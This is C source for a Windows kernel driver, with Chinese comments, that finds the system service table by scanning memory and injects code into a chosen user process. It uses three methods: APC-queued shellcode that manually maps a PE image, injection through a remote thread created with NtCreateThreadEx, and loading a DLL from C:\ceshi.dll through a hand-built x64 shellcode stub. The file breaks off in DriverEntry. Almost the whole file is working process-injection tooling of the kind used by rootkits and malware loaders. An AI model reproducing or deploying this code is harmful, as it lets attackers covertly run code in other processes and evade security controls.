#include <ntifs.h>
#include <ntimage.h>
#include <windef.h>
#include"injectshell.h"
#include"Mmsearch.h"

#define DLL_PATH   L"C:\\ceshi.dll"

NTKERNELAPI
CHAR* PsGetProcessImageFileName(__in PEPROCESS Process);


NTKERNELAPI
PVOID
NTAPI
PsGetThreadTeb(IN PETHREAD Thread);

NTKERNELAPI
BOOLEAN
NTAPI
KeTestAlertThread(IN KPROCESSOR_MODE AlertMode);

typedef VOID(NTAPI *PKNORMAL_ROUTINE)(
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2
	);

typedef VOID(NTAPI* PKKERNEL_ROUTINE)(
	PRKAPC Apc,
	PKNORMAL_ROUTINE *NormalRoutine,
	PVOID NormalContext,
	PVOID SystemArgument1,
	PVOID SystemArgument2
	);

typedef VOID(NTAPI* PKRUNDOWN_ROUTINE)(PRKAPC Apc);

typedef enum _KAPC_ENVIRONMENT
{
	OriginalApcEnvironment,
	AttachedApcEnvironment,
	CurrentApcEnvironment,
	InsertApcEnvironment,
}KAPC_ENVIRONMENT, * PKAPC_ENVIRONMENT;

NTKERNELAPI
VOID
NTAPI
KeInitializeApc(
	IN PKAPC Apc,
	IN PKTHREAD Thread,
	IN KAPC_ENVIRONMENT ApcStateIndex,
	IN PKKERNEL_ROUTINE KerenelRoutine,
	IN PKRUNDOWN_ROUTINE RundownRoutine,
	IN PKNORMAL_ROUTINE NormalRoutine,
	IN KPROCESSOR_MODE ApcMode,
	IN PVOID NormalContexe
);

NTKERNELAPI
BOOLEAN
NTAPI
KeInsertQueueApc(
PKAPC Apc,
PVOID SystemArgument1,
PVOID SystemArgument2,
KPRIORITY Increment
);


typedef NTSTATUS(NTAPI* fn_NtCreateThreadEx)
(
	OUT PHANDLE hTread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);
fn_NtCreateThreadEx NtCreateThreadEx;

typedef struct _SYSTEM_SERVICE_TABLE {
	PVOID       ServiceTableBase;
	PVOID       ServiceCounterTableBase;
	ULONGLONG   NumberOfServices;
	PVOID       ParamTableBase;
} SYSTEM_SERVICE_TABLE, * PSYSTEM_SERVICE_TABLE;
PSYSTEM_SERVICE_TABLE KeServiceDescriptorTable;

BYTE  InJectDllx64[] =
{
	0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x83, 0xec, 0x28,
	0x49, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x49, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x31, 0xd2,
	0x48, 0x31, 0xc9,
	0xff, 0xd0,
	0x48, 0x83, 0xc4, 0x28,
	0xc3
};



//fn_NtCreateThreadEx pfn_NtCreateThreadEx = NULL;
BOOLEAN   bacpinsert = FALSE;
KEVENT    apcenvent = { 0 };

ULONG GetIndexByName(UCHAR* sdName)
{
	NTSTATUS Status;
	HANDLE FileHandle;
	IO_STATUS_BLOCK ioStatus;
	FILE_STANDARD_INFORMATION FileInformation;
	//设置NTDLL路径
	UNICODE_STRING uniFileName;
	RtlInitUnicodeString(&uniFileName, L"\\SystemRoot\\system32\\ntdll.dll");

	//初始化打开文件的属性
	OBJECT_ATTRIBUTES objectAttributes;
	InitializeObjectAttributes(&objectAttributes, &uniFileName,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
	//创建文件

	Status = IoCreateFile(&FileHandle, FILE_READ_ATTRIBUTES | SYNCHRONIZE, &objectAttributes,
		&ioStatus, 0, FILE_READ_ATTRIBUTES, FILE_SHARE_READ, FILE_OPEN, FILE_SYNCHRONOUS_IO_NONALERT,
		NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);
	if (!NT_SUCCESS(Status))
		return 0;
	//获取文件信息

	Status = ZwQueryInformationFile(FileHandle, &ioStatus, &FileInformation,
		sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(Status)) {
		ZwClose(FileHandle);
		return 0;
	}
	//判断文件大小是否过大
	if (FileInformation.EndOfFile.HighPart != 0) {
		ZwClose(FileHandle);
		return 0;
	}
	//取文件大小
	ULONG uFileSize = FileInformation.EndOfFile.LowPart;


	//分配内存
	PVOID pBuffer = ExAllocatePoolWithTag(PagedPool, (ULONG64)uFileSize + 0x100, 0);
	if (pBuffer == NULL) {
		ZwClose(FileHandle);
		return 0;
	}

	//从头开始读取文件
	LARGE_INTEGER byteOffset;
	byteOffset.LowPart = 0;
	byteOffset.HighPart = 0;
	Status = ZwReadFile(FileHandle, NULL, NULL, NULL, &ioStatus, pBuffer, uFileSize, &byteOffset, NULL);
	if (!NT_SUCCESS(Status)) {
		ZwClose(FileHandle);
		return 0;
	}
	//取出导出表
	PIMAGE_DOS_HEADER  pDosHeader;
	PIMAGE_NT_HEADERS  pNtHeaders;
	PIMAGE_SECTION_HEADER pSectionHeader;
	ULONGLONG     FileOffset;//这里是64位数的，所以这里不是32个字节
	PIMAGE_EXPORT_DIRECTORY pExportDirectory;
	//DLL内存数据转成DOS头结构
	pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	//取出PE头结构
	pNtHeaders = (PIMAGE_NT_HEADERS)((ULONGLONG)pBuffer + pDosHeader->e_lfanew);
	//判断PE头导出表表是否为空


	if (pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0)
		return 0;

	//取出导出表偏移
	FileOffset = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	//取出节头结构
	pSectionHeader = (PIMAGE_SECTION_HEADER)((ULONGLONG)pNtHeaders + sizeof(IMAGE_NT_HEADERS));
	PIMAGE_SECTION_HEADER pOldSectionHeader = pSectionHeader;
	//遍历节结构进行地址运算
	for (UINT16 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
		if (pSectionHeader->VirtualAddress <= FileOffset && FileOffset <= (ULONG64)(pSectionHeader->VirtualAddress) + (ULONG64)(pSectionHeader->SizeOfRawData))
			FileOffset = FileOffset - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
	}

	//导出表地址
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((ULONGLONG)pBuffer + FileOffset);
	//取出导出表函数地址
	PULONG AddressOfFunctions;
	FileOffset = pExportDirectory->AddressOfFunctions;
	//遍历节结构进行地址运算
	pSectionHeader = pOldSectionHeader;
	for (UINT16 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
		if (pSectionHeader->VirtualAddress <= FileOffset && FileOffset <= (ULONG64)(pSectionHeader->VirtualAddress) + (ULONG64)(pSectionHeader->SizeOfRawData))
			FileOffset = FileOffset - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
	}
	AddressOfFunctions = (PULONG)((ULONGLONG)pBuffer + FileOffset);//这里注意一下foa和rva

	//取出导出表函数名字
	PUSHORT AddressOfNameOrdinals;
	FileOffset = pExportDirectory->AddressOfNameOrdinals;

	//遍历节结构进行地址运算
	pSectionHeader = pOldSectionHeader;
	for (UINT16 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
		if (pSectionHeader->VirtualAddress <= FileOffset && FileOffset <= (ULONG64)(pSectionHeader->VirtualAddress) + (ULONG64)(pSectionHeader->SizeOfRawData))
			FileOffset = FileOffset - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
	}
	AddressOfNameOrdinals = (PUSHORT)((ULONGLONG)pBuffer + FileOffset);//注意一下foa和rva

	//取出导出表函数序号
	PULONG AddressOfNames;
	FileOffset = pExportDirectory->AddressOfNames;

	//遍历节结构进行地址运算
	pSectionHeader = pOldSectionHeader;
	for (UINT16 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
		if (pSectionHeader->VirtualAddress <= FileOffset && FileOffset <= (ULONG64)(pSectionHeader->VirtualAddress) + (ULONG64)(pSectionHeader->SizeOfRawData))
			FileOffset = FileOffset - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
	}
	AddressOfNames = (PULONG)((ULONGLONG)pBuffer + FileOffset);//注意一下foa和rva


	//分析导出表
	ULONG uNameOffset = 0;
	ULONG uOffset = 0;
	LPSTR FunName;
	PVOID pFuncAddr;
	ULONG uServerIndex;
	ULONG uAddressOfNames;
	for (ULONG uIndex = 0; uIndex < pExportDirectory->NumberOfNames; uIndex++, AddressOfNames++, AddressOfNameOrdinals++) {
		uAddressOfNames = *AddressOfNames;
		pSectionHeader = pOldSectionHeader;
		for (UINT32 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
			if (pSectionHeader->VirtualAddress <= uAddressOfNames && uAddressOfNames <= pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)
				uOffset = uAddressOfNames - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
		}
		FunName = (LPSTR)((ULONGLONG)pBuffer + uOffset);
		if (FunName[0] == 'Z' && FunName[1] == 'w') {
			pSectionHeader = pOldSectionHeader;
			uOffset = (ULONG)AddressOfFunctions[*AddressOfNameOrdinals];
			for (UINT32 Index = 0; Index < pNtHeaders->FileHeader.NumberOfSections; Index++, pSectionHeader++) {
				if (pSectionHeader->VirtualAddress <= uOffset && uOffset <= pSectionHeader->VirtualAddress + pSectionHeader->SizeOfRawData)
					uNameOffset = uOffset - pSectionHeader->VirtualAddress + pSectionHeader->PointerToRawData;
			}
			pFuncAddr = (PVOID)((ULONGLONG)pBuffer + uNameOffset);
			uServerIndex = *(PULONG)((ULONGLONG)pFuncAddr + 4);
			FunName[0] = 'N';
			FunName[1] = 't';
			if (!_stricmp(FunName, (const char*)sdName)) {//获得指定的编号
				ExFreePoolWithTag(pBuffer, 0);
				ZwClose(FileHandle);
				return uServerIndex;
			}
		}
	}

	ExFreePoolWithTag(pBuffer, 0);
	ZwClose(FileHandle);
	return 0;
}

ULONGLONG GetSSDTFuncCurAddr(ULONG id)
{
	ULONG dwtmp = 0;
	PULONG ServiceTableBase = NULL;
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = ServiceTableBase[id];
	dwtmp = dwtmp >> 4;
	return (ULONG64)dwtmp + (ULONG64)ServiceTableBase;//需要先右移4位之后加上基地址，就可以得到ssdt的地址
}
int dv_SearchMem(char* memSourc, int memSize, char* searchdata, int len, int searchstart, BOOLEAN reversesearch)
{
	int dataindex = -1;
	if (memSourc == NULL || memSize <= len || len <= 0 || searchstart < 0)
	{
		return dataindex;
	}
	char* startp = memSourc + searchstart;
	char* endp = memSourc + memSize - len;

	char* curp = startp;
	while (curp >= memSourc && curp <= endp)
	{
		if (memcmp(curp, searchdata, len) == 0)
		{
			dataindex = (int)(curp - memSourc);
			break;
		}
		if (reversesearch)
			curp = curp - 1;
		else
			curp = curp + 1;
	}
	return dataindex;
}

ULONGLONG GetKeServiceDescriptorTable64_2()
{
	char KiSystemServiceStart_pattern[] = "\x8B\xF8\xC1\xEF\x07\x83\xE7\x20\x25\xFF\x0F\x00\x00";    //特征码
	PUCHAR StartSearchAddress = (PUCHAR)ZwClose;
	PUCHAR CodeScanStart = (PUCHAR)NtClose;
	int  searchsize = (int)(CodeScanStart - StartSearchAddress);
	PUCHAR ssdtaddr = 0, memaddr = 0;
	//dv_SearchMem功能就是从StartSearchAddress开始搜索searchsize大小的内存块有没有KiSystemServiceStart_pattern特征,有就返回特征所在偏移
	int of = dv_SearchMem((char*)StartSearchAddress, searchsize, KiSystemServiceStart_pattern, sizeof(KiSystemServiceStart_pattern) - 1, 0, FALSE);
	if (of > 0)
	{
		of = dv_SearchMem((char*)StartSearchAddress, searchsize, "\x4C\x8D\x15", 3, of, FALSE);
		if (of > 0)
		{
			memaddr = StartSearchAddress + of;
			ssdtaddr = memaddr + 7 + ((*(LONG*)(memaddr + 3)));
		}
	}
	return (ULONGLONG)ssdtaddr;
}

ULONGLONG GetKeServiceDescriptorTable64()
{
	PUCHAR StartSearchAddress = (PUCHAR)__readmsr(0xC0000082);
	PUCHAR EndSearchAddress = StartSearchAddress + 0x500;
	PUCHAR i = NULL;
	UCHAR b1 = 0, b2 = 0, b3 = 0;
	ULONG templong = 0;
	ULONGLONG addr = 0;
	for (i = StartSearchAddress; i < EndSearchAddress; i++)
	{
		if (MmIsAddressValid(i) && MmIsAddressValid(i + 1) && MmIsAddressValid(i + 2))
		{
			b1 = *i;
			b2 = *(i + 1);
			b3 = *(i + 2);
			if (b1 == 0x4c && b2 == 0x8d && b3 == 0x15) //4c8d15
			{
				memcpy(&templong, i + 3, 4);
				addr = (ULONGLONG)templong + (ULONGLONG)i + 7;
				return addr;
			}
		}
	}
	return 0;
}


DWORD    AsdlookupProcessByName(PCHAR aprocessname)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS tempep = NULL;
	DWORD     dret = 0;
	PCHAR     processname = NULL;

	for (dret = 4; dret < 16777215; dret = dret + 4)
	{
		status = PsLookupProcessByProcessId((HANDLE)dret, &tempep);
		if (NT_SUCCESS(status))
		{
			ObDereferenceObject(tempep);
			processname = PsGetProcessImageFileName(tempep);
			if (MmIsAddressValid(processname))
			{
				if (strstr(processname, aprocessname))
				{
					break;
				}
			}
		}

	}
	return dret;
}

PVOID    AsdReadFiletoKernelMM(PWCHAR filepath, PSIZE_T outsize)
{
	HANDLE  hfile = NULL;
	UNICODE_STRING  unicodepath = { 0 };
	OBJECT_ATTRIBUTES  oba = { 0 };
	IO_STATUS_BLOCK  iosb = { 0 };
	PVOID  pret = NULL;
	NTSTATUS  status = STATUS_UNSUCCESSFUL;
	RtlInitUnicodeString(&unicodepath, filepath);
	InitializeObjectAttributes(&oba, &unicodepath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwOpenFile(&hfile, GENERIC_ALL, &oba, &iosb, FILE_SHARE_WRITE, FILE_SYNCHRONOUS_IO_NONALERT);
	if (!NT_SUCCESS(status))
	{
		return NULL;
	}
	FILE_STANDARD_INFORMATION fsi = { 0 };
	status = ZwQueryInformationFile(hfile, &iosb, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hfile);
		return NULL;
	}
	pret = ExAllocatePool(PagedPool, (SIZE_T)fsi.EndOfFile.QuadPart);
	if (!(pret))
	{
		ZwClose(hfile);
		return NULL;
	}
	RtlZeroMemory(pret, (SIZE_T)fsi.EndOfFile.QuadPart);
	LARGE_INTEGER offset = { 0 };
	offset.QuadPart = 0;
	status = ZwReadFile(hfile, NULL, NULL, NULL, &iosb, pret, (LONG)fsi.EndOfFile.QuadPart, &offset, NULL);
	if (!NT_SUCCESS(status))
	{
		ZwClose(hfile);
		ExFreePool(pret);
		return NULL;
	}
	ZwClose(hfile);
	*outsize = fsi.EndOfFile.QuadPart;
	return pret;
}

BOOLEAN  AsdSkipApcThread(PETHREAD pThread)
{
	PUCHAR pTeb64 = NULL;
	pTeb64 = (PUCHAR)PsGetThreadTeb(pThread);
	
	if (!pTeb64)
		return TRUE;
	if (*(PULONG64)(pTeb64 + 0x78) != 0)
		return TRUE;

	if (*(PULONG64)(pTeb64 + 0x2c8) == 0)
		return TRUE;

	if (*(PULONG64)(pTeb64 + 0x58) == 0)
		return TRUE;

	return FALSE;
}

PETHREAD  AsdFindThreadInProcess(PEPROCESS tempep)
{
	PETHREAD  pretthreadojb = NULL, ptempthreadobj = NULL;
	PLIST_ENTRY  plisthead = NULL;
	PLIST_ENTRY  plistfink = NULL;
	INT          i = 0;
	plisthead = (PLIST_ENTRY)((PUCHAR)tempep + 0x30);
	plistfink = plisthead->Flink;
	for (plistfink; plistfink != plisthead; plistfink = plistfink->Flink)
	{
		ptempthreadobj = (PETHREAD)((PUCHAR)plistfink - 0x2f8);
		if (!MmIsAddressValid(ptempthreadobj))
			continue;
		i++;
		if (!AsdSkipApcThread(ptempthreadobj))
		{
			pretthreadojb = ptempthreadobj;
			break;
		}
	}
	return pretthreadojb;

}

VOID KernelAlertThreadApc(PKAPC Apc, 
	PKNORMAL_ROUTINE* NormalRoutine, 
	PVOID* NormalContext, 
	PVOID* SystemArgument1, 
	PVOID* SystemArgument2)
{
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
	KeTestAlertThread(UserMode);
	DbgPrint("<asdiop>----KernelRoutine irql=%d\n", KeGetCurrentIrql());
	
	ExFreePool(Apc);
	return;
}

VOID KernelApcNormalRoutine(PVOID NormalContext, PVOID arg1, PVOID arg2)
{
	DbgPrint("<asdiop>----KernelRoutine irql=%d\n", KeGetCurrentIrql());
	
	return;
}

VOID KernelInjectApc(
	PKAPC Apc,
	PKNORMAL_ROUTINE* NormalRoutine,
	PVOID* NormalContext,
	PVOID* SystemArgument1,
	PVOID* SystemArgument2)
{
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL;

	ExFreePool(Apc);

	bacpinsert = TRUE;

	KeSetEvent(&apcenvent, 0, FALSE);

	return;

}


NTSTATUS AsdQueueUserApc(
	IN PETHREAD pthreadobj,
	IN PVOID puserapccall,
	IN PVOID apccontext,
	IN PVOID arg2,
	IN PVOID arg3,
	IN BOOLEAN bforce)
{
	PKAPC pforceapc = NULL;

	PKAPC pinjectapc = NULL;

	if (pthreadobj == NULL)
		return STATUS_INVALID_PARAMETER;

	pinjectapc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));

	RtlZeroMemory(pinjectapc, sizeof(KAPC));

	KeInitializeApc(
		pinjectapc,
		(PKTHREAD)pthreadobj,
		OriginalApcEnvironment,
		(PKKERNEL_ROUTINE)KernelInjectApc,
		NULL,
		(PKNORMAL_ROUTINE)(ULONG_PTR)puserapccall,
		UserMode,
		apccontext);
	if (bforce)
	{
		pforceapc = (PKAPC)ExAllocatePool(NonPagedPool, sizeof(KAPC));

		RtlZeroMemory(pforceapc, sizeof(KAPC));

		KeInitializeApc(
			pforceapc,
			(PKTHREAD)pthreadobj,
			OriginalApcEnvironment,
			(PKKERNEL_ROUTINE)KernelAlertThreadApc,
			NULL,
			KernelApcNormalRoutine,
			KernelMode,
			NULL);
	}
	if (KeInsertQueueApc(pinjectapc, arg2, arg3, 0))
	{
		if (bforce && pforceapc)
		{
			KeInsertQueueApc(pforceapc, NULL, NULL, 0);
		}
		return STATUS_SUCCESS;

	}
	else
	{
		if (pinjectapc)
			ExFreePool(pinjectapc);

		if (pforceapc)
			ExFreePool(pforceapc);

		return STATUS_NOT_CAPABLE;
	}
	return STATUS_SUCCESS;
}
//无线程shellcode注入
NTSTATUS AsdKernelApcMapInject(DWORD pid, PVOID filebuffer, SIZE_T filesize)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	PEPROCESS tempep = NULL;

	KAPC_STATE  kapcs = { 0 };

	BOOLEAN battached = FALSE;

	PETHREAD apcthreadobj = NULL;

	PKAPC pkapcr = NULL;

	SIZE_T shellsize = 0, r3filesize = 0, r3imagesize = 0, ntimagesize = 0;

	PVOID pr3filebuffer = NULL, pr3shellbuffer = NULL, pr3imagebuffer = NULL;

	PIMAGE_DOS_HEADER pdos = NULL;

	PIMAGE_NT_HEADERS pnt = NULL;

	HANDLE hthread = NULL;

	PETHREAD pthreadobj = NULL;

	LARGE_INTEGER sleeptime = { 0 };
	do
	{
		status = PsLookupProcessByProcessId((HANDLE)pid, &tempep);
		if (!NT_SUCCESS(status))
			break;

		KeStackAttachProcess(tempep, &kapcs);

		battached = TRUE;

		apcthreadobj = AsdFindThreadInProcess(PsGetCurrentProcess());
		DbgPrint("<apcthreadobj>---%p\n", apcthreadobj);
		if (apcthreadobj == NULL)
		{
			break;
		}

		ObReferenceObject(apcthreadobj);

		pdos = (PIMAGE_DOS_HEADER)filebuffer;

		pnt = (PIMAGE_NT_HEADERS)((PUCHAR)filebuffer + pdos->e_lfanew);

		ntimagesize = pnt->OptionalHeader.SizeOfImage;

		r3imagesize = ntimagesize;

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3imagebuffer, 0, &r3imagesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
			break;
		DbgPrint("<111>---\n");
		RtlZeroMemory(pr3imagebuffer, r3imagesize);

		r3filesize = filesize;

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3filebuffer, 0, &r3filesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
			break;
		DbgPrint("<222>---\n");
		RtlZeroMemory(pr3filebuffer, r3filesize);

		shellsize = sizeof(MmLoadShell_x64);

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3shellbuffer, 0, &shellsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
			break;
		DbgPrint("<333>---\n");
		RtlZeroMemory(pr3shellbuffer, shellsize);

		RtlCopyMemory(pr3filebuffer, filebuffer, shellsize);

		*(PULONG_PTR)((PBYTE)MmLoadShell_x64 + 0x511) = (ULONG_PTR)pr3imagebuffer;
		RtlCopyMemory(pr3shellbuffer, MmLoadShell_x64, sizeof(MmLoadShell_x64));

		KeInitializeEvent(&apcenvent, SynchronizationEvent, FALSE);
		
		sleeptime.QuadPart = -10000000 * 5;
		
		status = AsdQueueUserApc(apcthreadobj, pr3shellbuffer, pr3filebuffer, NULL, NULL, TRUE);
		
		KeWaitForSingleObject(&apcenvent, Executive, KernelMode, FALSE, &sleeptime);
		
		status = STATUS_SUCCESS;
		break;

	} while (1);
	if (battached)
	{
		if (!bacpinsert)
		{
			status = STATUS_UNSUCCESSFUL;
		}
		else
		{
			sleeptime.QuadPart = -10000000 * 3;
			KeDelayExecutionThread(KernelMode, 0, &sleeptime);
			if (pr3filebuffer)
			{
				RtlZeroMemory(pr3filebuffer, r3filesize);
				ZwFreeVirtualMemory(NtCurrentProcess(), &pr3filebuffer, &r3filesize, MEM_RELEASE);

			}
			if (pr3shellbuffer)
			{
				RtlZeroMemory(pr3shellbuffer, shellsize);
				ZwFreeVirtualMemory(NtCurrentProcess(), &pr3shellbuffer, &shellsize, MEM_RELEASE);

			}

		}
		if (apcthreadobj)
		{
			ObDereferenceObject(apcthreadobj);
		}
		KeUnstackDetachProcess(&kapcs);

	}
	return status;
}

//有线程shellcode注入
NTSTATUS AsdKernelMapInject(DWORD pid, PVOID filebuffer, SIZE_T filesize)
{
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	PEPROCESS tempep = NULL;

	KAPC_STATE  kapcs = { 0 };

	BOOLEAN battached = FALSE;


	SIZE_T shellsize = 0, r3filesize = 0, r3imagesize = 0, ntimagesize = 0;

	PVOID pr3filebuffer = NULL, pr3shellbuffer = NULL, pr3imagebuffer = NULL;

	PIMAGE_DOS_HEADER pdos = NULL;

	PIMAGE_NT_HEADERS pnt = NULL;

	HANDLE hthread = NULL;

	PETHREAD pthreadobj = NULL;


	do
	{
		status = PsLookupProcessByProcessId((HANDLE)pid, &tempep);
		if (!NT_SUCCESS(status))
			break;
		KeStackAttachProcess(tempep, &kapcs);
		battached = TRUE;

		pdos = (PIMAGE_DOS_HEADER)filebuffer;

		pnt = (PIMAGE_NT_HEADERS)((PUCHAR)filebuffer + pdos->e_lfanew);

		ntimagesize = pnt->OptionalHeader.SizeOfImage;

		r3imagesize = ntimagesize;

		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3imagebuffer, 0, &r3imagesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
			break;

		RtlZeroMemory(pr3imagebuffer, r3imagesize);

		r3filesize = filesize;
		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3filebuffer, 0, &r3filesize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
			break;
		RtlZeroMemory(pr3filebuffer, r3filesize);

		shellsize = sizeof(MmLoadShell_x64);
		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &pr3shellbuffer, 0, &shellsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
			break;
		RtlZeroMemory(pr3shellbuffer, shellsize);

		RtlCopyMemory(pr3filebuffer, filebuffer, filesize);

		*(PULONG_PTR)((PBYTE)MmLoadShell_x64 + 0x511) = (ULONG_PTR)pr3imagebuffer;

		RtlCopyMemory(pr3shellbuffer, MmLoadShell_x64, sizeof(MmLoadShell_x64));
		//创建线程 执行shell

		status = NtCreateThreadEx(&hthread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), pr3shellbuffer, pr3filebuffer, 0, 0, 0x10000, 0x20000, NULL);
		if (!NT_SUCCESS(status))
			break;
		status = ObReferenceObjectByHandle(hthread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &pthreadobj, NULL);
		ZwClose(hthread);
		if (NT_SUCCESS(status))
		{
			KeWaitForSingleObject(pthreadobj, Executive, KernelMode, FALSE, NULL);
			ObDereferenceObject(pthreadobj);
		}
		status = STATUS_SUCCESS;
		break;

	} while (1);
	if (battached)
	{
		if (pr3filebuffer)
		{
			RtlZeroMemory(pr3filebuffer, r3filesize);
			ZwFreeVirtualMemory(NtCurrentProcess(), &pr3filebuffer, &r3filesize, MEM_RELEASE);

		}
		if (pr3shellbuffer)
		{
			RtlZeroMemory(pr3shellbuffer, shellsize);
			ZwFreeVirtualMemory(NtCurrentProcess(), &pr3shellbuffer, &shellsize, MEM_RELEASE);
		}
		KeUnstackDetachProcess(&kapcs);

	}
	return status;


}

//有模块注入
NTSTATUS AsdKernelLdrDllInject(DWORD pid)
{
	UNICODE_STRING dllpath = { 0 };

	NTSTATUS       status = STATUS_UNSUCCESSFUL;

	PEPROCESS      tempep = NULL;

	KAPC_STATE     kapcs = { 0 };

	PBYTE          threadstart = NULL;

	BOOLEAN        battached = FALSE;

	ULONG_PTR      ldrloaddlladdr = 0;

	ULONG_PTR      ntdllbase = 0;

	SIZE_T         shellsize = 0, outsize = 0;

	HANDLE         hthread = NULL;

	PETHREAD       pthreadobj = NULL;

	do
	{
		status = PsLookupProcessByProcessId((HANDLE)pid, &tempep);

		if (!NT_SUCCESS(status))
			break;

		ObReferenceObject(tempep);

		KeStackAttachProcess(tempep, &kapcs);

		battached = TRUE;

		RtlInitUnicodeString(&dllpath, DLL_PATH);

		ntdllbase = AsdGetProcessMoudleBase(PsGetCurrentProcess(), L"ntdll.dll");
		if (ntdllbase == 0)
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ldrloaddlladdr = (ULONG_PTR)AsdGetModuleExport((PVOID)ntdllbase, "LdrLoadDll");
		if (ldrloaddlladdr == 0)
		{
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		shellsize = PAGE_SIZE;
		status = ZwAllocateVirtualMemory(NtCurrentProcess(), &threadstart, 0, &shellsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			break;
		}
		RtlZeroMemory(threadstart, PAGE_SIZE);

		RtlCopyMemory(threadstart + 0x500, dllpath.Buffer, dllpath.Length);
		dllpath.Buffer = (PWCHAR)(threadstart + 0x500);
		dllpath.MaximumLength = 0x500;
		RtlCopyMemory(threadstart + 0x200, &dllpath, sizeof(dllpath));

		*(PULONG64)(InJectDllx64 + 2) = (ULONG64)ldrloaddlladdr;
		*(PULONG64)(InJectDllx64 + 16) = (ULONG64)(threadstart + 0x200);
		*(PULONG64)(InJectDllx64 + 26) = (ULONG64)(threadstart + 0x300);
		RtlCopyMemory(threadstart, InJectDllx64, sizeof(InJectDllx64));

		status = NtCreateThreadEx(&hthread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), threadstart, NULL, 0, 0, 0x10000, 0x2000, NULL);
		if (!NT_SUCCESS(status))
			break;
		status = ObReferenceObjectByHandle(hthread, THREAD_ALL_ACCESS, *PsThreadType, KernelMode, &pthreadobj, NULL);
		ZwClose(hthread);

		if (NT_SUCCESS(status))
		{
			KeWaitForSingleObject(pthreadobj, Executive, KernelMode, FALSE, NULL);
			ObDereferenceObject(pthreadobj);
		}
		status = STATUS_SUCCESS;
		break;
	} while (1);
	if(battached)
	{
		if (threadstart);
		{
			RtlZeroMemory(threadstart, PAGE_SIZE);
			ZwFreeVirtualMemory(NtCurrentProcess(), &threadstart, &shellsize, MEM_RELEASE);
		}
		KeUnstackDetachProcess(&kapcs);
	}
	return status;
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	DbgPrint("[+]DriverUnload:Success\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING Driver_Reg)
{
	DWORD pid = 0;
	PVOID kfilebuffer = NULL;
	SIZE_T mmsize = 0;
	DriverObject->DriverUnload = DriverUnload;
	ULONGLONG Temp_table = GetKeServiceDescriptorTable64_2();
	if (Temp_table == 0)
	{
		Temp_table = GetKeServiceDescriptorTable64();
		if (Temp_table == 0)
		{
			return STATUS_UNSUCCESSFUL;
		}
	}
